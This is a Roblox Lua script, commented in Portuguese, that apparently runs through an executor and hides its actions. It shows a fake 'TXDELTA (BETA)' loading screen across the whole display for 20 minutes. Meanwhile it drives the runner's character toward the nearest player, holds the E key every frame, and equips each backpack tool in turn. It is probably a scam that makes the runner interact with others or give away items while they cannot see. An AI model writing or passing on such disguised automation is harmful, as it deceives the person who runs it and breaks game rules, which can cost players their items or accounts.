local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

-- Tela de carregamento visual
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "TXDELTA_Loading"
loadingGui.Parent = CoreGui

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
background.Parent = loadingGui

local title = Instance.new("TextLabel")
title.Text = "TXDELTA (BETA)"
title.Size = UDim2.new(0.5, 0, 0.1, 0)
title.Position = UDim2.new(0.25, 0, 0.35, 0)
title.BackgroundTransparency = 1
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = background

local barOutline = Instance.new("Frame")
barOutline.Size = UDim2.new(0.5, 0, 0.05, 0)
barOutline.Position = UDim2.new(0.25, 0, 0.5, 0)
barOutline.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barOutline.BorderSizePixel = 0
barOutline.Parent = background

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barOutline

-- Anima carregamento visual até 100%
task.spawn(function()
	local percent = 0
	while percent <= 100 do
		percent += 1
		local tween = TweenService:Create(barFill, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {
			Size = UDim2.new(percent / 100, 0, 1, 0)
		})
		tween:Play()
		wait(0.05)
	end
end)

-- Mantém a tela por 20 minutos
task.delay(20 * 60, function()
	if loadingGui and loadingGui.Parent then
		loadingGui:Destroy()
	end
end)

-- Lógica principal de perseguição
local localPlayer = Players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local speed = 40
local minDistance = 5

local function getNearestPlayer()
	local nearest = nil
	local shortestDistance = math.huge

	for _, player in pairs(Players:GetPlayers()) do
		if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local targetHRP = player.Character.HumanoidRootPart
			local distance = (humanoidRootPart.Position - targetHRP.Position).Magnitude
			if distance < shortestDistance then
				shortestDistance = distance
				nearest = targetHRP
			end
		end
	end

	return nearest, shortestDistance
end

-- Loop: seguir jogador e manter tecla E pressionada
RunService.RenderStepped:Connect(function()
	VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)

	local target, distance = getNearestPlayer()
	if target and distance > minDistance then
		local direction = (target.Position - humanoidRootPart.Position).Unit
		humanoidRootPart.Velocity = direction * speed
	else
		humanoidRootPart.Velocity = Vector3.zero
	end
end)

-- Troca sequencial de ferramentas (8s equipado + 2s guardado = 10s por item)
task.spawn(function()
	local index = 1

	while true do
		task.wait(0.1)

		local backpack = localPlayer:FindFirstChildOfClass("Backpack")
		local tools = {}

		if backpack then
			for _, item in ipairs(backpack:GetChildren()) do
				if item:IsA("Tool") then
					table.insert(tools, item)
				end
			end
		end

		if #tools > 0 then
			if index > #tools then
				index = 1
			end

			local tool = tools[index]
			if tool then
				tool.Parent = character
				task.wait(8)
				if tool.Parent == character then
					tool.Parent = localPlayer.Backpack
				end
				task.wait(2)
				index += 1
			else
				task.wait(10)
			end
		else
			task.wait(10)
		end
	end
end)
